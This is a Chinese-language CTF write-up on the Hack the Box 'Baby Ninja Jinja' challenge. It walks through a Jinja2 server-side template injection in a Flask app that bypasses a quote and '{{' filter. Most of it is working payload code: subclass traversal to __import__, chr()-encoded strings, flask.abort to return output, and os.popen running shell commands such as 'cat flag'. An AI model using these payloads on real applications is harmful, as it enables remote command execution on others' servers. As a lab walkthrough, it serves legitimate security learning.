---
title: "Hack the Box——Baby Ninja Jinja"
date: 2020-09-12T19:10:07+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

## 0x00 

到了快乐周末，又有足够的时间来玩htb了。开始在htb上开了做了两个php的题，都没做出来，哎，不会php太难了。开第三个实例，终于不是和php相关的了。

## 0x01 拿到源码

开始访问页面，是一段奇怪的介绍，然后一个输入框

![1.png](1.png)

先随便输入个什么试试，发现输入`"`的时候，出现了flask的报错debug页面，看起来是存在注入的。

![2.png](2.png)

在仔细审计下返回的html，又发现了奇怪的东西，感觉htb出题目的人都喜欢把因此的接口放在注释里。

![3.png](3.png)

访问下`/debug`，嘿，这太眼熟了，flask。这个套路和之前rick那个好像是一样的，于是我看了下两道题的作者，果然是同一个人。

![4.png](4.png)

## 0x02 审计

拿到源码就开始审计，一共有两个路由，`/`和`/debug`，`/`接受一个`name`参数。

开始的注入点就发生在拼接插入sql的时候。

```
query_db('INSERT INTO ninjas (name) VALUES ("%s")' % name)
```

然后再仔细阅读代码发现，好像这个注入并不怎么关键，这里有模板有`{{`的过滤，那应该是ssti了。

代码的逻辑就是`传入name`=>`入库`=>`从数据库中读取name还有当前总数据量`=>`替换到模板中`=>`通过render_template_string渲染`。

那关键就在于控制输入，使得渲染的时候发生ssti。但是还要注意的是，这里在从数据库读数据出来的时候，有一个替换，也就是过滤操作。那jinja中的`{{}}`就不能使用了。

```
        db.text_factory = (lambda s: s.replace('{{', '').
            replace("'", '&#x27;').
            replace('"', '&quot;').
            replace('<', '&lt;').
            replace('>', '&gt;')
        )
```

## 0x03 寻找方法

看了些ssti的总结，对于过滤表达式`{{ }}`的，可以使用控制结构`{% %}`来代替。

在控制结构`{% %}`中，可以使用赋值操作。

![5.png](5.png)

通过这个就可以使用基类查找子类的形式拿到想要的方法来执行。

## 0x04 解决问题

鉴于上次题目没有用flask的特性而是走了盲注这种更慢的方法，先试试flask的session。题目的源码里有一个判断是不是leader的，如果是的话就返回，那直接要在渲染的时候通过ssti把这个session的值加上就好了。

```
            if session.get('leader'):
                return report
```

但是在构造payload的时候发现，如果要调用__builtins__的__import__，好像绕不开用单双引号。这里我想到了用内置的chr函数。

通过chr函数然后用加号拼接字符。比如要拿到__builtins__的话，就可以

```
{% set builtin=().__class__.__base__.__subclasses__()[59].__init__.__globals__[chr(95)%2bchr(95)%2bchr(98)%2bchr(117)%2bchr(105)%2bchr(108)%2bchr(116)%2bchr(105)%2bchr(110)%2bchr(115)%2bchr(95)%2bchr(95)] %}
```

这样就可以绕过引号了。但是发现这样服务端会报错`UndefinedError: 'chr' is undefined`，显然chr函数不能直接用，他还在builtins里面，今年一番搜索，我找到了获取chr的方法。

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
```

这样一来就可以正常使用了。

接下来就是修改session，既然要修改session，那就要导入flask。

```
def get_chr(s):
    res = []
    for i in s:
        res.append('chr({})'.format(ord(i)))
    return "%2b".join(res)
f'{\{% set flask=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("flask")}) %}}'  # 这里为了方便写payload写了个函数（斜杠是因为没斜杠我的博客会编译失败？）
```

拿到flask对象之后，就可以通过session的setdefault方法来修改他

```
f'{\{% set a=flask.session.setdefault({get_chr("leader")}, getchr("tttt")) %}}'
```

这样就成功通过修改session让服务端返回了resport的内容，但是我发现好像并没有什么作用


![6.png](6.png)


但是起码证明上次的修改session我学到了~


要怎么才能让服务端返回内容到客户端，不想再写盲注代码了。我的思路是让flask在模板渲染的时候就结束并返回，这样应该可以自定义内容，但是flask返回到客户端的数据都是靠return的，怎么才能不用return呢。


我想到flask有一个abort方法，调用flask.abort之后他就直接结束请求并返回数据到客户端了。

另外我看到源码里面有个例子`abort(Response('Hello World'))`，通过使用flask.Response对象就可以传递内容，这不就是我想要的嘛。构造结合前面拿到的flask对象，拼接上下面的代码。

```
f'{\{% set a=flask.abort(flask.Response({get_char("test")})) %}}'
```

![7.png](7.png)

成功控制返回结果了。

那在配上popen就可以执行命令了。set一个os对象，执行ls命令

```
f'{\{% set os=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("os")}) %}}'
f'{\{% set a=flask.abort(flask.Response(os.popen({get_chr("ls")}).read())) %}}'
```

成功执行了ls命令并返回结果到浏览器。

![8.png](8.png)


最后的生成payload的代码为

```
def get_chr(s):
    res = []
    for i in s:
        res.append('chr({})'.format(ord(i)))
    return "%2b".join(res)


def get_payload():
    # payload = f'{\{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}}{\{% if ().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("os")}).open({get_chr("templates/index.html")}, {get_chr("a+")}).write({get_chr("tttttt")}) %}}11{\{% endif %}}'
    define_chr = f"{\{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}}"
    define_flask = f'{\{% set flask=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("flask")}) %}}'
    define_os = f'{\{% set os=().__class__.__base__.__subclasses__()[59].__init__.__globals__[{get_chr("__builtins__")}][{get_chr("__import__")}]({get_chr("os")}) %}}'
    payload = f'{\{% set a=flask.abort(flask.Response(os.popen({get_chr("cat flag_P54ed")}).read())) %}}'
    payload = define_chr + define_flask + define_os + payload
    return payload
```

生成payload的为
```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{% set flask=().__class__.__base__.__subclasses__()[59].__init__.__globals__[chr(95)%2bchr(95)%2bchr(98)%2bchr(117)%2bchr(105)%2bchr(108)%2bchr(116)%2bchr(105)%2bchr(110)%2bchr(115)%2bchr(95)%2bchr(95)][chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(102)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(107)) %}{% set os=().__class__.__base__.__subclasses__()[59].__init__.__globals__[chr(95)%2bchr(95)%2bchr(98)%2bchr(117)%2bchr(105)%2bchr(108)%2bchr(116)%2bchr(105)%2bchr(110)%2bchr(115)%2bchr(95)%2bchr(95)][chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(111)%2bchr(115)) %}{% set a=flask.abort(flask.Response(os.popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(95)%2bchr(80)%2bchr(53)%2bchr(52)%2bchr(101)%2bchr(100)).read())) %}
```

成功拿到flag，通关~

![9.png](9.png)



## 0x05 参考资料



[Jinja2 template injection filter bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)

[浅谈flask ssti 绕过原理](https://xz.aliyun.com/t/8029#toc-8)

[Template Designer Documentation¶](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-control-structures)
